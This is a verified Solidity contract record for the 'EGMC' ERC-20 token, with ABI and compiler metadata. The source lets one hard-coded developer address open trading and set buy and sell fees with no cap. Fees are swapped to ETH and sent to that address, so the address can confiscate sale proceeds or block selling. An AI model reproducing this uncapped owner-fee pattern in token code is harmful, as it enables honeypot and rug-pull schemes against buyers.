{"SourceCode": "/*\r\n                                                                                               \r\n                                                                                                               \r\nEEEEEEEEEEEEEEEEEEEEEE             GGGGGGGGGGGGG     MMMMMMMM               MMMMMMMM             CCCCCCCCCCCCC\r\nE::::::::::::::::::::E          GGG::::::::::::G     M:::::::M             M:::::::M          CCC::::::::::::C\r\nE::::::::::::::::::::E        GG:::::::::::::::G     M::::::::M           M::::::::M        CC:::::::::::::::C\r\nEE::::::EEEEEEEEE::::E       G:::::GGGGGGGG::::G     M:::::::::M         M:::::::::M       C:::::CCCCCCCC::::C\r\n  E:::::E       EEEEEE      G:::::G       GGGGGG     M::::::::::M       M::::::::::M      C:::::C       CCCCCC\r\n  E:::::E                  G:::::G                   M:::::::::::M     M:::::::::::M     C:::::C              \r\n  E::::::EEEEEEEEEE        G:::::G                   M:::::::M::::M   M::::M:::::::M     C:::::C              \r\n  E:::::::::::::::E        G:::::G    GGGGGGGGGG     M::::::M M::::M M::::M M::::::M     C:::::C              \r\n  E:::::::::::::::E        G:::::G    G::::::::G     M::::::M  M::::M::::M  M::::::M     C:::::C              \r\n  E::::::EEEEEEEEEE        G:::::G    GGGGG::::G     M::::::M   M:::::::M   M::::::M     C:::::C              \r\n  E:::::E                  G:::::G        G::::G     M::::::M    M:::::M    M::::::M     C:::::C              \r\n  E:::::E       EEEEEE      G:::::G       G::::G     M::::::M     MMMMM     M::::::M      C:::::C       CCCCCC\r\nEE::::::EEEEEEEE:::::E       G:::::GGGGGGGG::::G     M::::::M               M::::::M       C:::::CCCCCCCC::::C\r\nE::::::::::::::::::::E        GG:::::::::::::::G     M::::::M               M::::::M        CC:::::::::::::::C\r\nE::::::::::::::::::::E          GGG::::::GGG:::G     M::::::M               M::::::M          CCC::::::::::::C\r\nEEEEEEEEEEEEEEEEEEEEEE             GGGGGG   GGGG     MMMMMMMM               MMMMMMMM             CCCCCCCCCCCCC\r\n                                                                                                              \r\n                                                                                                              \r\n                                                                                              \r\n                                                                          \r\n\r\nDocs - https://docs.egmc.info\r\nTwitter - https://twitter.com/EGMC_eth\r\nTelegram - https://t.me/EGMC_eth\r\nWebsite - https://egmc.info\r\n\r\n*/\r\n\r\n\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity 0.8.21;\r\n    \r\ninterface IUniswapV2Router02 {\r\n     function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n    \r\n    contract EGMC {\r\n        string public   name_ = \"Ethereum Gold Mining Company\"; \r\n        string public   symbol_ = \"EGMC\";  \r\n        uint8 public constant decimals = 18;\r\n        uint256 public constant totalSupply = 1000000000 * 10**decimals;\r\n\r\n        uint256 buyFee = 0;\r\n        uint256 sellFee = 0;\r\n        uint256 constant swapAmount = totalSupply / 100;\r\n\r\n        mapping (address => uint256) public balanceOf;\r\n        mapping (address => mapping (address => uint256)) public allowance;\r\n        \r\n        error Permissions();\r\n        \r\n        \r\n    \r\n        function name() public view virtual returns (string memory) {\r\n        return name_;\r\n        }\r\n\r\n    \r\n        function symbol() public view virtual returns (string memory) {\r\n        return symbol_;\r\n        }    \r\n\r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(\r\n            address indexed DEVv,\r\n            address indexed spender,\r\n            uint256 value\r\n        );\r\n        \r\n\r\n        address private pair;\r\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n        address payable constant DEVv = payable(address(0xfc18D78a40fB9EcdaED799ee6bb0e82bDDB9000e));\r\n\r\n        bool private swapping;\r\n        bool private tradingOpen;\r\n\r\n        constructor() {\r\n            balanceOf[msg.sender] = totalSupply;\r\n            allowance[address(this)][routerAddress] = type(uint256).max;\r\n            emit Transfer(address(0), msg.sender, totalSupply);\r\n        }\r\n\r\n        receive() external payable {}\r\n\r\n        function approve(address spender, uint256 amount) external returns (bool){\r\n            allowance[msg.sender][spender] = amount;\r\n            emit Approval(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n\r\n        function transfer(address to, uint256 amount) external returns (bool){\r\n            return _transfer(msg.sender, to, amount);\r\n        }\r\n\r\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n            allowance[from][msg.sender] -= amount;        \r\n            return _transfer(from, to, amount);\r\n        }\r\n\r\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n            require(tradingOpen || from == DEVv || to == DEVv);\r\n\r\n            if(!tradingOpen && pair == address(0) && amount > 0)\r\n                pair = to;\r\n\r\n            balanceOf[from] -= amount;\r\n\r\n            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n                swapping = true;\r\n                address[] memory path = new  address[](2);\r\n                path[0] = address(this);\r\n                path[1] = ETH;\r\n                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n                DEVv.transfer(address(this).balance);\r\n                swapping = false;\r\n            }\r\n\r\n            if(from != address(this)){\r\n                uint256 FeeAmount = amount * (from == pair ? buyFee : sellFee) / 100;\r\n                amount -= FeeAmount;\r\n                balanceOf[address(this)] += FeeAmount;\r\n            }\r\n            balanceOf[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n            return true;\r\n        }\r\n\r\n        function openTrading() external {\r\n            require(msg.sender == DEVv);\r\n            require(!tradingOpen);\r\n            tradingOpen = true;        \r\n        }\r\n\r\n        function _setFee(uint256 _buy, uint256 _sell) private {\r\n            buyFee = _buy;\r\n            sellFee = _sell;\r\n        }\r\n\r\n        function setFee(uint256 _buy, uint256 _sell) external {\r\n            if(msg.sender != DEVv)        \r\n                revert Permissions();\r\n            _setFee(_buy, _sell);\r\n        }\r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"DEVv\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name_\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"}],\"name\":\"setFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol_\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "EGMC", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://689a65579dbdc8aa74b38912753e37427528c72d35a5fa5b04f7cdebf6349b76"}